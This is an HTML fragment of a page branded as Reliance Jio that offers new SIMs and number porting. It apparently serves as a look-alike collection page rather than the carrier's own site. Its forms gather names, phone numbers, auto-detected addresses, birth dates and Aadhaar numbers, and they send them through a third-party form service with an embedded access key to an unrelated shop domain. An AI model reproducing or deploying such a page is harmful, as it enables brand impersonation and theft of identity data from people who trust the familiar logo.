  <div class="content">
    <div class="glass-card">
      <div class="airtel-logo">
        <img src="Jio.png" alt="Jio Logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/5/50/Reliance_Jio_Logo_%28October_2015%29.svg'" style="height: 80px; width:auto;">
      </div>
      
      <h1>Jio Services</h1>
      <p class="subtitle">Experience the Digital Life. New SIM or Porting available.</p>

      <div class="form-tabs">
        <button class="tab-button active" onclick="showForm('new-sim')">New SIM</button>
        <button class="tab-button" onclick="showForm('porting')">Port to Jio</button>
      </div>

      <div id="new-sim-form" class="form-container active">
        <form action="https://api.web3forms.com/submit" method="POST" class="contact-form" onsubmit="return validateNewSim()">
            <input type="hidden" name="access_key" value="e7d49fa5-f0e0-4dd9-8f05-7039e4e89cca">
            <input type="hidden" name="subject" value="New Jio SIM Order">
            <input type="hidden" name="redirect" value="https://pratheek.shop/Thank2.html">
            <input type="hidden" name="service_type" value="Jio New SIM">
            <input type="hidden" id="age-new" name="age" value="">
            <input type="hidden" id="auto-location-new" name="auto_location" value="">

            <div class="form-group">
                <label for="name-new">Full Name</label>
                <input type="text" id="name-new" name="name" required placeholder="Enter your full name">
            </div>

            <div class="form-group">
                <label for="phone-new">Phone Number</label>
                <input type="text" id="phone-new" name="phone" required pattern="[0-9]{10}" maxlength="10" placeholder="10-digit mobile number">
            </div>

            <div class="form-group">
                <label for="location-new">Delivery Location <button type="button" class="location-info-btn" onclick="showLocationInfo()">?</button></label>
                <input type="text" id="location-new" name="location" placeholder="Enter address (Auto-detecting...)">
            </div>

            <div class="form-group">
                <label for="dob-new">Date of Birth</label>
                <input type="date" id="dob-new" name="dob" required onchange="calculateAge('new')">
            </div>

            <div id="age-display-new" class="age-display" style="display:none;">
                Age: <span id="age-value-new">0</span> years
            </div>

            <button type="submit" class="submit-btn">Order New Jio SIM</button>
        </form>
      </div>

      <div id="porting-form" class="form-container">
        <form action="https://api.web3forms.com/submit" method="POST" class="contact-form" onsubmit="return validatePorting()">
            <input type="hidden" name="access_key" value="e7d49fa5-f0e0-4dd9-8f05-7039e4e89cca">
            <input type="hidden" name="subject" value="Port to Jio Request">
            <input type="hidden" name="redirect" value="https://pratheek.shop/Thank2.html">
            <input type="hidden" name="service_type" value="Port to Jio">
            <input type="hidden" id="age-port" name="age" value="">
            <input type="hidden" id="auto-location-port" name="auto_location" value="">

            <div class="form-group">
                <label for="name-port">Full Name</label>
                <input type="text" id="name-port" name="name" required placeholder="Enter your full name">
            </div>

            <div class="form-group">
                <label for="phone-port">Existing Phone Number</label>
                <input type="text" id="phone-port" name="phone" required pattern="[0-9]{10}" maxlength="10" placeholder="Number you want to port">
            </div>

            <div class="form-group">
                <label for="porting-from">Current Operator</label>
                <select id="porting-from" name="porting_from" required>
                    <option value="">-- Select Operator --</option>
                    <option value="Airtel">Airtel</option>
                    <option value="VI">VI (Vodafone Idea)</option>
                    <option value="BSNL">BSNL</option>
                </select>
            </div>

            <div class="form-group">
                <label for="location-port">Delivery Location <button type="button" class="location-info-btn" onclick="showLocationInfo()">?</button></label>
                <input type="text" id="location-port" name="location" placeholder="Enter address (Auto-detecting...)">
            </div>

            <div class="form-group">
                <label for="dob-port">Date of Birth</label>
                <input type="date" id="dob-port" name="dob" required onchange="calculateAge('port')">
            </div>

            <div id="age-display-port" class="age-display" style="display:none;">
                Age: <span id="age-value-port">0</span> years
            </div>

            <div class="form-group">
                <label for="aadhar-port">Aadhar Number (eKYC)</label>
                <input type="text" id="aadhar-port" name="aadhar" required pattern="[0-9]{12}" maxlength="12" placeholder="12-digit Aadhar number">
            </div>

            <button type="submit" class="submit-btn">Submit Port Request</button>
        </form>
      </div>
